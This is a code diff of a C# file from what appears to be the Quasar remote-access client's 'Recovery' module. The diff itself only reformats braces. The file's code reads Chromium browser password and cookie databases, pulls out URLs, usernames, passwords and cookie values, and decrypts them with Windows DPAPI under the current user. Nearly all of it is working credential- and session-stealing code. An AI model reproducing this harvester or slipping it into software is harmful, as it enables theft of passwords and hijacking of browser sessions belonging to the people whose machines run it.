@@ -5,24 +5,18 @@ using System.Security.Cryptography;
 using System.Text;
 using Quasar.Common.Models;
 
-namespace Quasar.Client.Recovery.Utilities
-{
-    public class ChromiumBase
-    {
-        public static List<RecoveredAccount> Passwords(string datapath, string browser)
-        {
+namespace Quasar.Client.Recovery.Utilities {
+    public class ChromiumBase {
+        public static List<RecoveredAccount> Passwords(string datapath, string browser) {
             List<RecoveredAccount> data = new List<RecoveredAccount>();
             SQLiteHandler SQLDatabase = null;
 
             if (!File.Exists(datapath))
                 return data;
 
-            try
-            {
+            try {
                 SQLDatabase = new SQLiteHandler(datapath);
-            }
-            catch (Exception)
-            {
+            } catch (Exception) {
                 return data;
             }
 
@@ -34,35 +28,28 @@ namespace Quasar.Client.Recovery.Utilities
             string pass;
             int totalEntries = SQLDatabase.GetRowCount();
 
-            for (int i = 0; i < totalEntries; i++)
-            {
-                try
-                {
+            for (int i = 0; i < totalEntries; i++) {
+                try {
                     host = SQLDatabase.GetValue(i, "origin_url");
                     user = SQLDatabase.GetValue(i, "username_value");
                     pass = Decrypt(SQLDatabase.GetValue(i, "password_value"));
 
-                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(user) && pass != null)
-                    {
-                        data.Add(new RecoveredAccount
-                        {
+                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(user) && pass != null) {
+                        data.Add(new RecoveredAccount {
                             Url = host,
                             Username = user,
                             Password = pass,
                             Application = browser
                         });
                     }
-                }
-                catch (Exception)
-                {
+                } catch (Exception) {
                     // TODO: Exception handling
                 }
             }
 
             return data;
         }
-        public static List<ChromiumCookie> Cookies(string dataPath, string browser)
-        {
+        public static List<ChromiumCookie> Cookies(string dataPath, string browser) {
             string datapath = dataPath;
 
             List<ChromiumCookie> data = new List<ChromiumCookie>();
@@ -70,12 +57,9 @@ namespace Quasar.Client.Recovery.Utilities
 
             if (!File.Exists(datapath))
                 return data;
-            try
-            {
+            try {
                 SQLDatabase = new SQLiteHandler(datapath);
-            }
-            catch (Exception)
-            {
+            } catch (Exception) {
                 return data;
             }
 
@@ -96,10 +80,8 @@ namespace Quasar.Client.Recovery.Utilities
 
             int totalEntries = SQLDatabase.GetRowCount();
 
-            for (int i = 0; i < totalEntries; i++)
-            {
-                try
-                {
+            for (int i = 0; i < totalEntries; i++) {
+                try {
                     host = SQLDatabase.GetValue(i, "host_key");
                     name = SQLDatabase.GetValue(i, "name");
                     value = Decrypt(SQLDatabase.GetValue(i, "encrypted_value"));
@@ -114,10 +96,8 @@ namespace Quasar.Client.Recovery.Utilities
                     priority = SQLDatabase.GetValue(i, "priority") == "1";
 
 
-                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && !String.IsNullOrEmpty(value))
-                    {
-                        data.Add(new ChromiumCookie
-                        {
+                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && !String.IsNullOrEmpty(value)) {
+                        data.Add(new ChromiumCookie {
                             HostKey = host,
                             Name = name,
                             Value = value,
@@ -133,26 +113,21 @@ namespace Quasar.Client.Recovery.Utilities
 
                         });
                     }
-                }
-                catch (Exception)
-                {
+                } catch (Exception) {
 
                 }
             }
 
             return data;
         }
-        private static string Decrypt(string EncryptedData)
-        {
-            if (EncryptedData == null || EncryptedData.Length == 0)
-            {
+        private static string Decrypt(string EncryptedData) {
+            if (EncryptedData == null || EncryptedData.Length == 0) {
                 return null;
             }
             byte[] decryptedData = ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
             return Encoding.UTF8.GetString(decryptedData);
         }
-        public class ChromiumCookie
-        {
+        public class ChromiumCookie {
             public string HostKey { get; set; }
             public string Name { get; set; }
             public string Value { get; set; }
@@ -165,8 +140,7 @@ namespace Quasar.Client.Recovery.Utilities
             public bool Persistent { get; set; }
             public bool Priority { get; set; }
             public string Browser { get; set; }
-            public override string ToString()
-            {
+            public override string ToString() {
                 return String.Format("Domain: {1}{0}Cookie Name: {2}{0}Value: {3}{0}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", Environment.NewLine, HostKey, Name, Value, Path, Expired, HttpOnly, Secure);
             }
         }
